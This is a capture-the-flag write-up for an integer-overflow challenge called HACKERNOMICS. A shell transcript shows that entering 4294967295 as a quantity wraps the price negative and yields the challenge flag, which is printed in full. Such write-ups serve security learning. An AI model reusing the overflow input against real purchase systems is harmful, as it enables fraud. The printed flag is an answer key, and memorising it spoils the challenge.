## HACKERNOMICS [60]
**Tags**: integer overflow, `strtoul()`

**Description**: How hard could buying flags on the digital underground be? Exploit the service in `/home/problems/1e02ae39d617fc791db3e193108298f7/hackernomics_8` on the shell server to find out; also available for analysis at [hackernomics](hackernomics).

## Solution

To be honest, I just manually fuzzed this with some edge-case decimal integers and it worked with one of them. `4294967295` is `0xffffffff` in hex. The binary makes several calls to `strtoul()`, but I did not do a thorough investigation into how the integer overflow affected program flow.

```
ameise@shell:~$ cd /home/problems/1e02ae39d617fc791db3e193108298f7/hackernomics_8
ameise@shell:/home/problems/1e02ae39d617fc791db3e193108298f7/hackernomics_8$ ls
flag  hackernomics
ameise@shell:/home/problems/1e02ae39d617fc791db3e193108298f7/hackernomics_8$ ./hackernomics 
╻ ╻┏━╸╻  ┏━╸┏━┓┏┳┓┏━╸   ╺┳╸┏━┓   ╻ ╻┏━┓┏━╸╻┏ ┏━╸┏━┓┏┓╻┏━┓┏┳┓╻┏━╸┏━┓
┃╻┃┣╸ ┃  ┃  ┃ ┃┃┃┃┣╸     ┃ ┃ ┃   ┣━┫┣━┫┃  ┣┻┓┣╸ ┣┳┛┃┗┫┃ ┃┃┃┃┃┃  ┗━┓
┗┻┛┗━╸┗━╸┗━╸┗━┛╹ ╹┗━╸    ╹ ┗━┛   ╹ ╹╹ ╹┗━╸╹ ╹┗━╸╹┗╸╹ ╹┗━┛╹ ╹╹┗━╸┗━┛
   ┏━┓╺┳┓╻ ╻┏━┓┏┓╻┏━╸┏━╸╺┳┓   ┏┳┓┏━┓┏━┓╻┏ ┏━╸╺┳╸   ┏━┓╻┏┳┓╻ ╻╻  ┏━┓╺┳╸┏━┓┏━┓
   ┣━┫ ┃┃┃┏┛┣━┫┃┗┫┃  ┣╸  ┃┃   ┃┃┃┣━┫┣┳┛┣┻┓┣╸  ┃    ┗━┓┃┃┃┃┃ ┃┃  ┣━┫ ┃ ┃ ┃┣┳┛
   ╹ ╹╺┻┛┗┛ ╹ ╹╹ ╹┗━╸┗━╸╺┻┛   ╹ ╹╹ ╹╹┗╸╹ ╹┗━╸ ╹    ┗━┛╹╹ ╹┗━┛┗━╸╹ ╹ ╹ ┗━┛╹┗╸

You have $100
What would you like to buy?
1. Heart: $5
2. Potion: $50
3. Kitten!: $500
4. Flag: $500000
4294967295
How many Flags would you like to buy?
That will be $-1510924576.  Have a nice day, enjoy your 94967295 Flags.
What, you thought you could just *buy* the flag?

Well, you were right.
Your flag is: disruptive_innovation_indeed_0ae31748cAd7e8d241F59bb9b3cd1CBD
You have $1510924676
What would you like to buy?
1. Heart: $5
2. Potion: $50
3. Kitten!: $500
4. Flag: $500000

```